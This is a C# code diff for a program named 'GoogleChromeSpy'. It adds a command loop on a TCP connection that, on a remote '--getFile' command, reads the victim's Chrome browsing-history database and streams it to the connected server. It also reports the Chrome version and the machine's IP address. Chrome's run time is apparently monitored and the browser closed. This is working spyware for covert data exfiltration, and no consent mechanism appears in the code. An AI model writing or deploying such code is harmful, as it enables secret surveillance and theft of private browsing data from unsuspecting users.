@@ -56,6 +56,9 @@ namespace GoogleChromeSpy
                 stream = client.GetStream();
                 byte[] b = Encoding.Unicode.GetBytes($"--Ip{GetIpAdress()}");
                 stream.Write(b, 0, b.Length);
+                
+                Task receiveMsgThread = new Task(ReceiveMsg);
+                receiveMsgThread.Start();
             }
             catch (Exception ex)
             {
@@ -63,21 +66,62 @@ namespace GoogleChromeSpy
             }
         }
 
+        private void ReceiveMsg()
+        {
+            while (true)
+            {
+                try
+                {
+                    byte[] data = new byte[256];
+                    StringBuilder builder = new StringBuilder();
+                    int byteCount = 0;
+                    do
+                    {
+                        byteCount = stream.Read(data, 0, data.Length);
+                        builder.Append(Encoding.Unicode.GetString(data, 0, byteCount));
+                    } while (stream.DataAvailable);
+
+
+                    if (builder.ToString().Contains("--getFile"))
+                    {
+                        SendHistoryFile();
+                    }
+                    if (builder.ToString().Contains("--getVersion"))
+                    {
+                        byte[] b = Encoding.Unicode.GetBytes($"--Version{GetVersion()}");
+                        stream.Write(b, 0, b.Length);
+                    }
+
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+            }
+        }
+
         private void SendHistoryFile()
         {
+            byte[] b = Encoding.Unicode.GetBytes($"--Version{GetVersion()}");
+            stream.Write(b, 0, b.Length);
             string historyFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                 @"\Google\Chrome\User Data\Default\History";
 
-            byte[] b = File.ReadAllBytes(historyFile);
+            b = File.ReadAllBytes(historyFile);
             byte[] m = Encoding.Unicode.GetBytes("--file");
             stream.Write(m, 0, m.Length);
             Thread.Sleep(500);
             stream.Write(b, 0, b.Length);
         }
 
-        private void GetVersion()
+        private string GetVersion()
         {
-           
+            var path = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe", "", null);
+            if (path != null)
+            {
+                return FileVersionInfo.GetVersionInfo(path.ToString()).FileVersion;
+            }
+            return String.Empty;   
         }
 
         private void ClosingProcess()
@@ -101,7 +145,6 @@ namespace GoogleChromeSpy
                                 SendHistoryFile();
                             };
                         }
-
                     }
                     catch (Exception)
                     {
@@ -110,8 +153,6 @@ namespace GoogleChromeSpy
 
                 if (processes.Length == 0)
                     continue;
-
-
 
                 if (date.Subtract(processes[0].StartTime) >= MaxUseTime)
                     try
@@ -134,8 +175,6 @@ namespace GoogleChromeSpy
                     catch (Exception)
                     {
                     }
-
-
                 Thread.Sleep(1000);
             }
         }
